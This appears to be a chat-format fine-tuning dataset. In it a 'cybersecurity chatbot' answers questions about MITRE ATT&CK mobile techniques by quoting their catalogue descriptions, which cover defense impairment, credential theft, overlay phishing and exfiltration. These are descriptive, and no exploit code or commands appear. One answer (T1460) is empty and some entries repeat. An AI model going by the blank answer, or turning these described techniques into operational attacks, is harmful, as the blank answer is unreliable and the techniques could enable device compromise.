{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Impair Defenses' and with the Id: T1629 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Impair Defenses' and with the Id: T1629 is described as follows: Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may span both native defenses as well as supplemental capabilities installed by users or mobile endpoint administrators.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Abuse Accessibility Features' and with the Id: T1453 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Abuse Accessibility Features' and with the Id: T1453 is described as follows: **This technique has been deprecated. Please use [Input Capture](https://attack.mitre.org/techniques/T1417), [Input Injection](https://attack.mitre.org/techniques/T1516), and [Input Prompt](https://attack.mitre.org/techniques/T1411) where appropriate.**A malicious app could abuse Android's accessibility features to capture sensitive data or perform other malicious actions.(Citation: Skycure-Accessibility)Adversaries may abuse accessibility features on Android to emulate a user's clicks, for example to steal money from a user's bank account.(Citation: android-trojan-steals-paypal-2fa)(Citation: banking-trojans-google-play)Adversaries may abuse accessibility features on Android devices to evade defenses by repeatedly clicking the \"Back\" button when a targeted app manager or mobile security app is launched, or when strings suggesting uninstallation are detected in the foreground. This effectively prevents the malicious application from being uninstalled.(Citation: android-trojan-steals-paypal-2fa). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation of Remote Services' and with the Id: T1428 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation of Remote Services' and with the Id: T1428 is described as follows: Adversaries may exploit remote services of enterprise servers, workstations, or other resources to gain unauthorized access to internal systems once inside of a network. Adversaries may exploit remote services by taking advantage of a mobile device\u2019s access to an internal enterprise network through local connectivity or through a Virtual Private Network (VPN). Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1423) or other Discovery methods. These look for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.Depending on the permissions level of the vulnerable remote service, an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1404) as a result of lateral movement exploitation as well. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Protocols' and with the Id: T1437.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Protocols' and with the Id: T1437.001 is described as follows: Adversaries may communicate using application layer protocols associated with web protocols traffic to avoid detection/network filtering by blending in with existing traffic. Commands to remote mobile devices, and often the results of those commands, will be embedded within the protocol traffic between the mobile client and server. Web protocols such as HTTP and HTTPS are used for web traffic as well as well as notification services native to mobile messaging services such as Google Cloud Messaging (GCM) and newly, Firebase Cloud Messaging (FCM), (GCM/FCM: two-way communication) and Apple Push Notification Service (APNS; one-way server-to-device).  Such notification services leverage HTTP/S via the respective API and are commonly abused on Android and iOS respectively in order blend in with routine device traffic making it difficult for enterprises to inspect. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steal Application Access Token' and with the Id: T1635 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steal Application Access Token' and with the Id: T1635 is described as follows: Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering or URI hijacking and typically requires user action to grant access, such as through a system \u201cOpen With\u201d dialogue.  Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework used to issue tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry through OAuth 2.0 using a variety of authorization protocols. An example of a commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested without requiring user credentials.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Evasion' and with the Id: T1628.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Evasion' and with the Id: T1628.002 is described as follows: Adversaries may attempt to avoid detection by hiding malicious behavior from the user. By doing this, an adversary\u2019s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device. While there are many ways this can be accomplished, one method is by using the device\u2019s sensors. By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with. That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing. Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Virtualization/Sandbox Evasion' and with the Id: T1633 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Virtualization/Sandbox Evasion' and with the Id: T1633 is described as follows: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors after checking for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware\u2019s behavior to disengage from the victim or conceal the core functions of the payload. They may also search for VME artifacts before dropping further payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1633) during automated discovery to shape follow-on behaviors. Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1633) such as checking for system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keychain' and with the Id: T1579 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keychain' and with the Id: T1579 is described as follows: Adversaries may collect the keychain storage data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials.On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, an adversary can access the entire encrypted database.(Citation: Apple Keychain Services)(Citation: Elcomsoft Decrypt Keychain). The systems targeted by this attack pattern are: iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Versioning' and with the Id: T1661 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Versioning' and with the Id: T1661 is described as follows: An adversary may push an update to a previously benign application to add malicious code. This can be accomplished by pushing an initially benign, functional application to a trusted application store, such as the Google Play Store or the Apple App Store. This allows the adversary to establish a trusted userbase that may grant permissions to the application prior to the introduction of malicious code. Then, an application update could be pushed to introduce malicious code.(Citation: android_app_breaking_bad)This technique could also be accomplished by compromising a developer\u2019s account. This would allow an adversary to take advantage of an existing userbase without having to establish the userbase themselves. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Sensitive Data in Device Logs' and with the Id: T1413 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Sensitive Data in Device Logs' and with the Id: T1413 is described as follows: On versions of Android prior to 4.1, an adversary may use a malicious application that holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or other sensitive data stored in the device's system log. On Android 4.1 and later, an adversary would need to attempt to perform an operating system privilege escalation attack to be able to access the log.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command and Scripting Interpreter' and with the Id: T1623 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command and Scripting Interpreter' and with the Id: T1623 is described as follows: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, Android is a UNIX-like OS and includes a basic [Unix Shell](https://attack.mitre.org/techniques/T1623/001) that can be accessed via the Android Debug Bridge (ADB) or Java\u2019s `Runtime` package.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0027) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify Tools' and with the Id: T1629.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify Tools' and with the Id: T1629.003 is described as follows: Adversaries may disable security tools to avoid potential detection of their tools and activities. This can take the form of disabling security software, modifying SELinux configuration, or other methods to interfere with security tools scanning or reporting information. This is typically done by abusing device administrator permissions or using system exploits to gain root access to the device to modify protected system files.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Ingress Tool Transfer' and with the Id: T1544 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Ingress Tool Transfer' and with the Id: T1544 is described as follows: Adversaries may transfer tools or other files from an external system onto a compromised device to facilitate follow-on actions. Files may be copied from an external adversary-controlled system through the command and control channel  or through alternate protocols with another tool such as FTP.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic Resolution' and with the Id: T1637 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic Resolution' and with the Id: T1637 is described as follows: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. This algorithm can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit via Radio Interfaces' and with the Id: T1477 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit via Radio Interfaces' and with the Id: T1477 is described as follows: The mobile device may be targeted for exploitation through its interface to cellular networks or other radio interfaces.### Baseband Vulnerability ExploitationA message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) or other) to the mobile device could exploit a vulnerability in code running on the device(Citation: Register-BaseStation)(Citation: Weinmann-Baseband).### Malicious SMS MessageAn SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device(Citation: Forbes-iPhoneSMS). An SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser. Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages(Citation: SRLabs-SIMCard).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Service Scanning' and with the Id: T1423 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Service Scanning' and with the Id: T1423 is described as follows: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Evasion' and with the Id: T1618 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Evasion' and with the Id: T1618 is described as follows: Adversaries may attempt to avoid detection by hiding malicious behavior from the user. By doing this, an adversary\u2019s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device. While there are many ways this can be accomplished, one method is by using the device\u2019s sensors. By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with. That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing. Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over C2 Channel' and with the Id: T1646 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over C2 Channel' and with the Id: T1646 is described as follows: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Privilege Escalation' and with the Id: T1404 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Privilege Escalation' and with the Id: T1404 is described as follows: Adversaries may exploit software vulnerabilities in order to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in an application, service, within the operating system software, or kernel itself to execute adversary-controlled code. Security constructions, such as permission levels, will often hinder access to information and use of certain techniques. Adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a device, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and applications running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user- level permission to root permissions depending on the component that is vulnerable. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Call Control' and with the Id: T1616 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Call Control' and with the Id: T1616 is described as follows: Adversaries may make, forward, or block phone calls without user authorization. This could be used for adversary goals such as audio surveillance, blocking or forwarding calls from the device owner, or C2 communication.Several permissions may be used to programmatically control phone calls, including:* `ANSWER_PHONE_CALLS` - Allows the application to answer incoming phone calls(Citation: Android Permissions)* `CALL_PHONE` - Allows the application to initiate a phone call without going through the Dialer interface(Citation: Android Permissions)* `PROCESS_OUTGOING_CALLS` - Allows the application to see the number being dialed during an outgoing call with the option to redirect the call to a different number or abort the call altogether(Citation: Android Permissions)* `MANAGE_OWN_CALLS` - Allows a calling application which manages its own calls through the self-managed `ConnectionService` APIs(Citation: Android Permissions)* `BIND_TELECOM_CONNECTION_SERVICE` - Required permission when using a `ConnectionService`(Citation: Android Permissions)* `WRITE_CALL_LOG` - Allows an application to write to the device call log, potentially to hide malicious phone calls(Citation: Android Permissions)When granted some of these permissions, an application can make a phone call without opening the dialer first. However, if an application desires to simply redirect the user to the dialer with a phone number filled in, it can launch an Intent using `Intent.ACTION_DIAL`, which requires no specific permissions. This then requires the user to explicitly initiate the call or use some form of [Input Injection](https://attack.mitre.org/techniques/T1516) to programmatically initiate it.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Unencrypted Non-C2 Protocol' and with the Id: T1639.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Unencrypted Non-C2 Protocol' and with the Id: T1639.001 is described as follows: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). Adversaries may employ custom or publicly available encoding/compression algorithms (such as base64) or embed data within protocol headers and fields.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Broadcast Receivers' and with the Id: T1624.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Broadcast Receivers' and with the Id: T1624.001 is described as follows: Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities. An intent is a message passed between Android applications or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received. In addition to Android system intents, malicious applications can register for intents broadcasted by other applications. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications. In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.(Citation: Android Changes to System Broadcasts) . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Commonly Used Port' and with the Id: T1436 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Commonly Used Port' and with the Id: T1436 is described as follows: Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as* TCP:80 (HTTP)* TCP:443 (HTTPS)* TCP:25 (SMTP)* TCP/UDP:53 (DNS)They may use the protocol associated with the port or a completely different protocol.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Eavesdrop on Insecure Network Communication' and with the Id: T1439 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Eavesdrop on Insecure Network Communication' and with the Id: T1439 is described as follows: If network traffic between the mobile device and remote servers is unencrypted or is encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop on communication.(Citation: mHealth). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Notifications' and with the Id: T1517 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Notifications' and with the Id: T1517 is described as follows: Adversaries may collect data within notifications sent by the operating system or other applications. Notifications may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums. In the case of Credential Access, adversaries may attempt to intercept one-time code sent to the device. Adversaries can also dismiss notifications to prevent the user from noticing that the notification has arrived and can trigger action buttons contained within notifications.(Citation: ESET 2FA Bypass) . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Traffic Capture or Redirection' and with the Id: T1410 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Traffic Capture or Redirection' and with the Id: T1410 is described as follows: An adversary may capture network traffic to and from the device to obtain credentials or other sensitive data, or redirect network traffic to flow through an adversary-controlled gateway to do the same.A malicious app could register itself as a VPN client on Android or iOS to gain access to network packets. However, on both platforms, the user must grant consent to the app to act as a VPN client, and on iOS the app requires a special entitlement that must be granted by Apple.Alternatively, if a malicious app is able to escalate operating system privileges, it may be able to use those privileges to gain access to network traffic.An adversary could redirect network traffic to an adversary-controlled gateway by establishing a VPN connection or by manipulating the device's proxy settings. For example, Skycure (Citation: Skycure-Profiles) describes the ability to redirect network traffic by installing a malicious iOS Configuration Profile.If applications encrypt their network traffic, sensitive data may not be accessible to an adversary, depending on the point of capture.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Input Prompt' and with the Id: T1411 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Input Prompt' and with the Id: T1411 is described as follows: The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Adversaries may mimic this functionality to prompt users for sensitive information.Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique\u2019s use.(Citation: Felt-PhishingOnMobileDevices)Specific approaches to this technique include:### Impersonate the identity of a legitimate applicationA malicious application could impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and get installed on the device. The malicious app could then prompt the user for sensitive information.(Citation: eset-finance)### Display a prompt on top of a running legitimate applicationA malicious application could display a prompt on top of a running legitimate application to trick users into entering sensitive information into the malicious application rather than the legitimate application. Typically, the malicious application would need to know when the targeted application (and individual activity within the targeted application) is running in the foreground, so that the malicious application knows when to display its prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the current foreground application through modifications to the `ActivityManager` API.(Citation: Android-getRunningTasks)(Citation: StackOverflow-getRunningAppProcesses). A malicious application can still abuse Android\u2019s accessibility features to determine which application is currently in the foreground.(Citation: ThreatFabric Cerberus) Approaches to display a prompt include:* A malicious application could start a new activity on top of a running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique.(Citation: Android Background)* A malicious application could create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions, and at least under certain conditions is automatically granted to applications installed from the Google Play Store.(Citation: Cloak and Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.(Citation: XDA Bubbles)### Fake device notificationsA malicious application could send fake device notifications to the user. Clicking on the device notification could trigger the malicious application to display an input prompt.(Citation: Group IB Gustuff Mar 2019). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Alternative Protocol' and with the Id: T1639 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Alternative Protocol' and with the Id: T1639 is described as follows: Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may opt to also encrypt and/or obfuscate these alternate channels. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internet Connection Discovery' and with the Id: T1422.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internet Connection Discovery' and with the Id: T1422.001 is described as follows: Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using `adb shell netstat` for Android.(Citation: adb_commands)Adversaries may use the results and responses from these requests to determine if the mobile devices are capable of communicating with adversary-owned C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Biometric Spoofing' and with the Id: T1460 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Biometric Spoofing' and with the Id: T1460 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Boot or Logon Initialization Scripts' and with the Id: T1398 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Boot or Logon Initialization Scripts' and with the Id: T1398 is described as follows: Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts are part of the underlying operating system and are not accessible to the user unless the device has been rooted or jailbroken. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Execution Guardrails' and with the Id: T1627 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Execution Guardrails' and with the Id: T1627 is described as follows: Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include environment information such as location.(Citation: SWB Exodus March 2019)Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [System Checks](https://attack.mitre.org/techniques/T1633/001). While use of [System Checks](https://attack.mitre.org/techniques/T1633/001) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'GUI Input Capture' and with the Id: T1417.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'GUI Input Capture' and with the Id: T1417.002 is described as follows: Adversaries may mimic common operating system GUI components to prompt users for sensitive information with a seemingly legitimate prompt. The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique\u2019s use.(Citation: Felt-PhishingOnMobileDevices)There are several approaches adversaries may use to mimic this functionality. Adversaries may impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and, when installed on the device, may prompt the user for sensitive information.(Citation: eset-finance) Adversaries may also send fake device notifications to the user that may trigger the display of an input prompt when clicked.(Citation: Group IB Gustuff Mar 2019) Additionally, adversaries may display a prompt on top of a running, legitimate application to trick users into entering sensitive information into a malicious application rather than the legitimate application. Typically, adversaries need to know when the targeted application and the individual activity within the targeted application is running in the foreground to display the prompt at the proper time. Adversaries can abuse Android\u2019s accessibility features to determine which application is currently in the foreground.(Citation: ThreatFabric Cerberus) Two known approaches to displaying a prompt include:* Adversaries start a new activity on top of a running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique.(Citation: Android Background)* Adversaries create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions and, at least under certain conditions, is automatically granted to applications installed from the Google Play Store.(Citation: Cloak and Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.(Citation: XDA Bubbles). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Contact List' and with the Id: T1432 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Contact List' and with the Id: T1432 is described as follows: An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.. The systems targeted by this attack pattern are: Android, iOS ."}]}
